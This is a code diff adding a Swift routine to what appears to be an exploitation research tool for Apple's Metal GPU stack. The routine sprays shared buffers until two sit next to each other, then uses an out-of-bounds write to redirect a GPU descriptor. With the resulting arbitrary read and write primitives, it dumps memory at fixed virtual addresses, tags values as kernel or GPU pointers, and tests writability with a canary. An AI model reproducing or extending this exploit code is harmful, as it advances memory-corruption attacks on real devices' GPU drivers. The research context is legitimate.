@@ -3920,6 +3920,165 @@ func runDenseMapAndWrite(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// ── runNewHitDump ─────────────────────────────────────────────────────────────
+// Deep-dive into the two new GPU VA hits found in stage16:
+//   A: 0x1500029000 region (hits at +0x400 and +0x800)
+//   B: spray-adjacent descriptor at lo+0x400
+//
+// For each:
+//   1. CPU readback — if the hit VA falls inside lo's CPU mapping, read directly
+//   2. GPU dump — 128-qword (1KB) snapshot via read redirect
+//   3. Writability probe — canary write + readback, restore
+//   4. Classify every non-zero field (kernel ptr / GPU ptr / data)
+// ─────────────────────────────────────────────────────────────────────────────
+func runNewHitDump(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── New Hit Dump ──")
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+
+        let BUF_LEN  = 4096
+        let CANARY: UInt64 = 0xC0FFEE_DEADC0DE
+
+        // Spray
+        var sprayBufs: [MTLBuffer] = []
+        var lo: MTLBuffer!
+        var hi: MTLBuffer!
+        for _ in 0..<64 {
+            guard let b = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = sprayBufs.last, prev.gpuAddress + UInt64(BUF_LEN) == b.gpuAddress {
+                lo = prev; hi = b
+            }
+            sprayBufs.append(b)
+        }
+        guard lo != nil, hi != nil else { step("✗ spray failed"); completion(); return }
+        step("✓ lo=0x\(String(lo.gpuAddress,radix:16)) hi=0x\(String(hi.gpuAddress,radix:16))")
+
+        let multiScanSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void multiScan(device Probe* probes [[buffer(0)]],
+                              device ulong* out    [[buffer(1)]],
+                              uint tid [[thread_position_in_grid]]) {
+            out[tid] = probes[tid].buf[0];
+        }
+        """
+        let gpuWriteSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void gpuWrite(device Probe* p [[buffer(0)]], device ulong* src [[buffer(1)]]) {
+            p[0].buf[0] = src[0];
+        }
+        """
+        guard let lib1  = try? device.makeLibrary(source: multiScanSrc, options: nil),
+              let lib2  = try? device.makeLibrary(source: gpuWriteSrc,  options: nil),
+              let rFn   = lib1.makeFunction(name: "multiScan"),
+              let wFn   = lib2.makeFunction(name: "gpuWrite"),
+              let rPso  = try? device.makeComputePipelineState(function: rFn),
+              let wPso  = try? device.makeComputePipelineState(function: wFn) else {
+            step("✗ PSO failed"); completion(); return
+        }
+
+        func oobWriteVA(_ idx: Int, _ va: UInt64) {
+            lo.contents().assumingMemoryBound(to: UInt64.self)[BUF_LEN/8 + idx * 2] = va
+        }
+
+        // Read one qword from targetVA via GPU
+        func gpuRead(_ va: UInt64) -> UInt64 {
+            guard let out = device.makeBuffer(length: 8, options: .storageModeShared) else { return 0 }
+            oobWriteVA(0, va)
+            guard let q = device.makeCommandQueue(), let cb = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { return 0 }
+            enc.setComputePipelineState(rPso)
+            enc.setBuffer(hi, offset: 0, index: 0)
+            enc.setBuffer(out,offset: 0, index: 1)
+            enc.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1),
+                                threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
+            enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+            return out.contents().assumingMemoryBound(to: UInt64.self)[0]
+        }
+
+        // Write one qword to targetVA via GPU
+        func gpuWrite(_ va: UInt64, _ val: UInt64) {
+            guard let src = device.makeBuffer(length: 8, options: .storageModeShared) else { return }
+            src.contents().assumingMemoryBound(to: UInt64.self)[0] = val
+            oobWriteVA(0, va)
+            guard let q = device.makeCommandQueue(), let cb = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { return }
+            enc.setComputePipelineState(wPso)
+            enc.setBuffer(hi, offset: 0, index: 0)
+            enc.setBuffer(src,offset: 0, index: 1)
+            enc.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1),
+                                threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
+            enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+        }
+
+        func classify(_ val: UInt64) -> String {
+            let hi32 = val >> 32
+            if hi32 >= 0xFFFFFE00 { return "★★ KERNEL PTR" }
+            if hi32 >= 0x14000000 && hi32 <= 0x15FFFFFF { return "★  GPU PTR" }
+            return "   data"
+        }
+
+        // GPU 128-qword dump of a base VA
+        func dumpRegion(label: String, baseVA: UInt64) {
+            step("── dump: \(label) @ 0x\(String(baseVA,radix:16)) ──")
+            for slot in 0..<128 {
+                let va = baseVA + UInt64(slot * 8)
+                let val = gpuRead(va)
+                if val != 0 {
+                    let tag = classify(val)
+                    step("  \(tag) +0x\(String(format:"%04x",slot*8))  0x\(String(val,radix:16))")
+                }
+            }
+        }
+
+        // Writability probe
+        func probeWrite(label: String, va: UInt64) {
+            let orig = gpuRead(va)
+            step("── writability: \(label) @ 0x\(String(va,radix:16)) orig=0x\(String(orig,radix:16)) ──")
+            gpuWrite(va, CANARY)
+            let readback = gpuRead(va)
+            if readback == CANARY {
+                step("  ★★ WRITABLE — canary stuck")
+                gpuWrite(va, orig)   // restore
+            } else {
+                step("  read-only — readback=0x\(String(readback,radix:16))")
+            }
+        }
+
+        // ── A: 0x1500029000 region ──
+        step("═══ REGION A: 0x1500029000 ═══")
+        dumpRegion(label: "0x1500029000", baseVA: 0x1500029000)
+        probeWrite(label: "hit@0x1500029400", va: 0x1500029400)
+        probeWrite(label: "hit@0x1500029800", va: 0x1500029800)
+
+        // ── B: spray-adjacent descriptor at lo+0x400 ──
+        let sprayDesc = lo.gpuAddress + 0x400
+        step("═══ REGION B: lo+0x400 = 0x\(String(sprayDesc,radix:16)) ═══")
+
+        // CPU readback — check if it's within lo's CPU mapping
+        step("── CPU readback of lo buffer ──")
+        let loPtr = lo.contents().assumingMemoryBound(to: UInt64.self)
+        for i in stride(from: 0, through: 127, by: 1) {
+            let val = loPtr[i]
+            if val != 0 {
+                let tag = classify(val)
+                step("  \(tag) lo[+0x\(String(format:"%04x",i*8))] = 0x\(String(val,radix:16))")
+            }
+        }
+        step("── GPU dump of lo+0x400 region ──")
+        dumpRegion(label: "sprayDesc", baseVA: sprayDesc)
+        probeWrite(label: "sprayDesc+0x0000", va: sprayDesc)
+        probeWrite(label: "sprayDesc+0x0020", va: sprayDesc + 0x20)
+
+        step("── New Hit Dump complete ──")
+        completion()
+    }
+}
+
 // ── runFineVAScan ─────────────────────────────────────────────────────────────
 // High-resolution sweep of the Metal runtime GPU VA region to find all driver
 // structures.  Previous scans used 4KB step — this uses 512-byte step across
